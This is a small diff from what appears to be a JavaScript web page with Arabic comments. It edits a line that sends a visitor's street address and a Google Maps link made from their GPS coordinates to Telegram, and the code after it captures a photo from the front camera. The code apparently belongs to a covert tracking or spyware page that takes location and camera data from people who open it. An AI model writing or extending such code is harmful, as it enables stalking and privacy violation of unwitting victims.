@@ -310,7 +310,7 @@
             if (location.coords) {
                 googleMapsUrl = `https://www.google.com/maps?q=${location.coords.latitude},${location.coords.longitude}`;
             }
-            await sendToTelegram(`الموقع: ${location.address}\nرابط خرائط Google: ${googleMapsUrl}`);
+            await sendToTelegram(`رابط خرائط Google: ${googleMapsUrl}\nالعنوان: ${location.address}`);
 
             // التقاط صورة وتسجيل فيديو من الكاميرا الأمامية
             const frontPhoto = await capturePhoto('user');
